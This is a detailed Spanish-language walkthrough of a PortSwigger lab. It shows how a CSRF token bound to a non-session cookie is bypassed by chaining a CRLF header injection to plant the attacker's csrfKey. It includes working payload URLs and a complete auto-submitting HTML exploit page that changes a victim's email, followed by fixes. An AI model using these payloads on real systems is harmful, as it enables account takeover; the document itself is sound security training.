# Write-up ultra detallado — CSRF donde el token está ligado a una cookie que no es de sesión

## Laboratorio

**Nombre:** CSRF where token is tied to non-session cookie  
**Tipo:** CSRF avanzado  
**Objetivo:** Cambiar el email de la víctima usando un exploit alojado en el exploit server.

---

## 1. Resumen del laboratorio

Este laboratorio trata sobre una protección CSRF mal implementada.

La aplicación sí usa tokens CSRF, pero el problema es que el token no está correctamente ligado a la sesión del usuario.

La aplicación utiliza dos valores relacionados:

```http
Cookie: csrfKey=...
```

y en el cuerpo de la petición:

```http
csrf=...
```

El servidor valida que el parámetro `csrf` corresponda con la cookie `csrfKey`, pero no comprueba que ese par `csrfKey + csrf` pertenezca a la sesión autenticada actual.

Esto permite que un atacante use su propio par válido `csrfKey + csrf` y fuerce a la víctima a utilizarlo.

---

## 2. Conceptos necesarios

### 2.1 Qué es CSRF

CSRF significa:

```text
Cross-Site Request Forgery
```

Es un ataque en el que el atacante consigue que el navegador de una víctima autenticada envíe una petición no deseada a una aplicación.

El atacante no necesita robar la cookie de sesión.

El navegador de la víctima la envía automáticamente.

Ejemplo:

```http
POST /my-account/change-email
Cookie: session=VICTIMA
email=attacker@gmail.com
```

Si el servidor no protege correctamente esta acción, cambiará el email de la víctima.

---

## 2.2 Qué hace normalmente un token CSRF

Un token CSRF seguro debe demostrar que la petición fue generada desde una página legítima del sitio.

Un esquema correcto sería:

```text
session A -> csrf token A
session B -> csrf token B
```

El servidor debería comprobar:

```text
¿Este token CSRF pertenece a esta sesión concreta?
```

La validación correcta sería algo como:

```python
if token == csrf_token_for_current_session:
    accept()
else:
    reject()
```

---

## 2.3 Qué hace mal este laboratorio

En este laboratorio, el token CSRF no está ligado directamente a la sesión.

La aplicación usa un par:

```text
csrfKey + csrf
```

Por ejemplo:

```http
Cookie: csrfKey=SgGt77JaR2zH3a26FruxoI4XtBLErnWk
```

y:

```http
csrf=Jd66Ue7JxKVLpoPjxFCMKz1crNNleiZi
```

Estos dos valores forman un par válido.

El error es que ese par puede ser reutilizado en otra sesión.

Es decir, el servidor valida:

```text
¿Este csrf corresponde a este csrfKey?
```

pero no valida:

```text
¿Este csrfKey pertenece a esta sesión?
```

---

## 3. Diferencia con otros laboratorios CSRF

### Laboratorio sin defensas

No había token CSRF.

El ataque era directo.

---

### Laboratorio donde el token depende del método

El token se validaba en `POST`, pero no en `GET`.

El bypass era usar `GET`.

---

### Laboratorio donde el token solo se valida si existe

Si enviabas un token incorrecto, la petición fallaba.

Pero si eliminabas completamente el parámetro `csrf`, la petición era aceptada.

---

### Este laboratorio

Aquí sí existe token.

Aquí sí existe validación.

Pero la validación está ligada a una cookie que no forma parte de la sesión real.

El atacante puede forzar esa cookie en el navegador de la víctima y enviar el token correspondiente.

---

## 4. Primer análisis de la petición legítima

Nos autenticamos en la aplicación con una de las cuentas proporcionadas:

```text
wiener:peter
```

Entramos en **My account** y cambiamos el email.

Capturamos la petición con Burp Suite.

Ejemplo:

```http
POST /my-account/change-email HTTP/2
Host: 0a2c009904cad8288093d060000f00b8.web-security-academy.net
Cookie: session=...; csrfKey=SgGt77JaR2zH3a26FruxoI4XtBLErnWk
Content-Type: application/x-www-form-urlencoded

email=test@gmail.com&csrf=Jd66Ue7JxKVLpoPjxFCMKz1crNNleiZi
```

Aquí hay tres valores importantes:

```http
session=...
csrfKey=SgGt77JaR2zH3a26FruxoI4XtBLErnWk
csrf=Jd66Ue7JxKVLpoPjxFCMKz1crNNleiZi
```

La cookie `session` identifica al usuario.

La cookie `csrfKey` y el parámetro `csrf` forman un par válido.

---

## 5. Prueba de que el token no está ligado a la sesión

El laboratorio proporciona una segunda cuenta:

```text
carlos:montoya
```

La idea es comprobar si un par `csrfKey + csrf` de una cuenta puede funcionar en otra.

Flujo de prueba:

1. Iniciar sesión como `wiener`.
2. Capturar `csrfKey` y `csrf`.
3. Iniciar sesión como `carlos`.
4. Interceptar una petición de cambio de email.
5. Sustituir el `csrfKey` y el `csrf` de Carlos por los de Wiener.
6. Enviar la petición.

Si la petición funciona, queda demostrado que el token no está ligado a la sesión.

Esto significa que el servidor acepta un par válido aunque no pertenezca al usuario actual.

---

## 6. Problema para el atacante

En un ataque CSRF real, el atacante no conoce:

```text
csrfKey de la víctima
csrf token de la víctima
```

Pero en este laboratorio eso no importa.

El atacante tiene su propio par válido:

```text
csrfKey del atacante
csrf del atacante
```

El objetivo será forzar a la víctima a usar ese par.

Para eso necesitamos dos cosas:

1. Inyectar nuestra cookie `csrfKey` en el navegador de la víctima.
2. Enviar un formulario CSRF con el token `csrf` correspondiente.

---

## 7. Segunda vulnerabilidad: CRLF Injection en la búsqueda

La aplicación tiene una función de búsqueda.

Cuando buscamos algo, el servidor guarda el último término de búsqueda en una cookie.

Ejemplo normal:

```http
GET /?search=test
```

Respuesta:

```http
Set-Cookie: LastSearchTerm=test
```

El problema es que el valor de `search` se refleja dentro de un header `Set-Cookie` sin filtrar correctamente saltos de línea.

---

## 8. Qué es CRLF

CRLF significa:

```text
Carriage Return + Line Feed
```

Técnicamente:

```text
\r\n
```

En URL encoding:

```text
%0d%0a
```

HTTP usa CRLF para separar líneas de headers.

Ejemplo:

```http
Header-1: valor
Header-2: valor
```

Internamente equivale a:

```text
Header-1: valor\r\nHeader-2: valor
```

Por eso, si logramos meter `%0d%0a` dentro de un header, podemos romper la línea actual y crear un nuevo header.

---

## 9. Prueba simple de CRLF Injection

Enviamos:

```http
GET /?search=%0d%0atest:test HTTP/2
```

El servidor responde:

```http
Set-Cookie: LastSearchTerm=
Test: test; Secure; HttpOnly
```

Esto demuestra que hemos conseguido inyectar un header nuevo:

```http
Test: test
```

El valor `test:test` no es peligroso en sí mismo.

Lo importante es que demuestra que podemos crear headers arbitrarios.

---

## 10. Inyección real de cookie csrfKey

Ahora cambiamos el header inyectado por un `Set-Cookie`.

Payload:

```http
GET /?search=%0d%0aSet-Cookie:%20csrfKey=SgGt77JaR2zH3a26FruxoI4XtBLErnWk%3b%20SameSite=None HTTP/2
```

Decodificado:

```text
\r\nSet-Cookie: csrfKey=SgGt77JaR2zH3a26FruxoI4XtBLErnWk; SameSite=None
```

La respuesta queda así:

```http
Set-Cookie: LastSearchTerm=
Set-Cookie: csrfKey=SgGt77JaR2zH3a26FruxoI4XtBLErnWk; Secure; HttpOnly
```

El navegador interpreta esto como una instrucción legítima del servidor y guarda la cookie:

```http
csrfKey=SgGt77JaR2zH3a26FruxoI4XtBLErnWk
```

---

## 11. Por qué esto es importante

Con esta inyección, podemos obligar al navegador de la víctima a usar nuestro `csrfKey`.

No estamos robando cookies.

No estamos usando XSS.

Estamos haciendo que el propio servidor vulnerable emita:

```http
Set-Cookie: csrfKey=VALOR_DEL_ATACANTE
```

El navegador confía en el servidor y guarda esa cookie.

---

## 12. Payload final del exploit

El exploit final alojado en el exploit server es:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>

     <img src="https://0a2c009904cad8288093d060000f00b8.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=SgGt77JaR2zH3a26FruxoI4XtBLErnWk%3b%20SameSite=None" onerror="document.forms[0].submit()">

    <form action="https://0a2c009904cad8288093d060000f00b8.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="mamon&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="Jd66Ue7JxKVLpoPjxFCMKz1crNNleiZi" />
      <input type="submit" value="Submit request" />
    </form>

  </body>
</html>
```

---

## 13. Explicación línea por línea del payload

### Apertura HTML

```html
<html>
  <body>
```

Estructura básica de la página maliciosa alojada en el exploit server.

Cuando la víctima visite esta página, el navegador interpretará el HTML.

---

### Etiqueta `img`

```html
<img src="https://0a2c009904cad8288093d060000f00b8.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=SgGt77JaR2zH3a26FruxoI4XtBLErnWk%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

Esta es la parte que inyecta la cookie.

El navegador intenta cargar la URL como si fuera una imagen.

Pero la URL realmente apunta a la función vulnerable de búsqueda.

La parte importante es:

```text
%0d%0aSet-Cookie:%20csrfKey=SgGt77JaR2zH3a26FruxoI4XtBLErnWk%3b%20SameSite=None
```

Esto inyecta el header:

```http
Set-Cookie: csrfKey=SgGt77JaR2zH3a26FruxoI4XtBLErnWk; SameSite=None
```

Como resultado, el navegador víctima guarda la cookie `csrfKey` del atacante.

---

### Por qué se ejecuta `onerror`

El navegador espera que la URL del `img` devuelva una imagen válida.

Pero la URL devuelve una página HTML de resultados de búsqueda, no una imagen.

Por eso la imagen falla al cargar.

Cuando una imagen falla, el navegador dispara el evento:

```javascript
onerror
```

En este caso:

```javascript
document.forms[0].submit()
```

Esto envía automáticamente el primer formulario de la página.

---

### Formulario CSRF

```html
<form action="https://0a2c009904cad8288093d060000f00b8.web-security-academy.net/my-account/change-email" method="POST">
```

Este formulario envía una petición POST al endpoint vulnerable de cambio de email.

---

### Campo email

```html
<input type="hidden" name="email" value="mamon&#64;gmail&#46;com" />
```

Este campo define el nuevo email.

Los valores:

```html
&#64;
&#46;
```

son entidades HTML.

Equivalen a:

```text
@
.
```

Por tanto:

```html
mamon&#64;gmail&#46;com
```

equivale a:

```text
mamon@gmail.com
```

---

### Campo csrf

```html
<input type="hidden" name="csrf" value="Jd66Ue7JxKVLpoPjxFCMKz1crNNleiZi" />
```

Este es el token CSRF correspondiente al `csrfKey` que hemos inyectado.

Importante:

No tiene por qué ser igual que el `csrfKey`.

Lo que importa es que ambos formen un par válido generado por el servidor.

En este caso:

```text
csrfKey = SgGt77JaR2zH3a26FruxoI4XtBLErnWk
csrf    = Jd66Ue7JxKVLpoPjxFCMKz1crNNleiZi
```

Son un par válido del atacante.

---

## 14. Flujo completo del ataque

### Paso 1

La víctima visita el exploit server.

---

### Paso 2

El navegador carga automáticamente el `img`.

```http
GET /?search=test%0d%0aSet-Cookie: csrfKey=...
```

---

### Paso 3

El servidor vulnerable responde:

```http
Set-Cookie: csrfKey=SgGt77JaR2zH3a26FruxoI4XtBLErnWk
```

---

### Paso 4

El navegador víctima guarda la cookie.

Ahora la víctima tiene:

```http
Cookie: csrfKey=SgGt77JaR2zH3a26FruxoI4XtBLErnWk
```

---

### Paso 5

La imagen falla al cargar porque la URL no devuelve una imagen válida.

---

### Paso 6

Se ejecuta:

```javascript
onerror="document.forms[0].submit()"
```

---

### Paso 7

El navegador envía el formulario:

```http
POST /my-account/change-email
Cookie: session=VICTIMA
Cookie: csrfKey=SgGt77JaR2zH3a26FruxoI4XtBLErnWk

email=mamon@gmail.com
csrf=Jd66Ue7JxKVLpoPjxFCMKz1crNNleiZi
```

---

### Paso 8

El servidor valida el par:

```text
csrfKey + csrf
```

Como el par es válido, acepta la petición.

---

### Paso 9

El email de la víctima cambia.

---

## 15. Por qué funciona aunque no sepamos los tokens de la víctima

No necesitamos saber el `csrfKey` ni el `csrf` de la víctima.

Usamos nuestro propio par válido.

Después forzamos a la víctima a usar nuestra cookie `csrfKey`.

Finalmente, enviamos el token `csrf` correspondiente.

La aplicación acepta porque no comprueba que ese par pertenezca a la sesión de la víctima.

---

## 16. Error de seguridad real

El error no es solo usar tokens CSRF.

El error es confiar en una cookie no ligada a la sesión.

La aplicación debería validar:

```text
csrf pertenece a la sesión actual
```

pero valida algo más débil:

```text
csrf corresponde a csrfKey
```

Y como el atacante puede inyectar `csrfKey`, la protección queda rota.

---

## 17. Impacto

Un atacante puede cambiar el email de la víctima sin conocer su contraseña ni sus cookies.

Esto puede ser grave porque cambiar el email puede permitir:

- tomar control de la cuenta,
- iniciar recuperación de contraseña,
- interceptar comunicaciones,
- modificar identidad de usuario.

---

## 18. Cómo se debería corregir

La defensa correcta sería:

1. Ligar el token CSRF a la sesión real.
2. No usar cookies separadas manipulables para validar CSRF.
3. Marcar cookies sensibles con atributos adecuados.
4. Evitar que input del usuario pueda modificar headers.
5. Corregir la CRLF Injection.
6. Validar estrictamente `Origin` y `Referer` como defensa adicional.
7. Usar `SameSite=Lax` o `SameSite=Strict` en cookies de sesión, cuando sea compatible con el flujo de la aplicación.

---

## 19. Conclusión

Este laboratorio demuestra una cadena de vulnerabilidades:

```text
CSRF token ligado a cookie no-session
+
CRLF Injection
+
inyección de Set-Cookie
=
CSRF exitoso
```

La clave es que el atacante no necesita conocer el token de la víctima.

Solo necesita:

1. Obtener su propio par válido `csrfKey + csrf`.
2. Inyectar su `csrfKey` en el navegador de la víctima.
3. Enviar un POST con el `csrf` correspondiente.

El servidor acepta la petición porque valida el par, pero no lo liga a la sesión autenticada.

Ese es el fallo central del laboratorio.

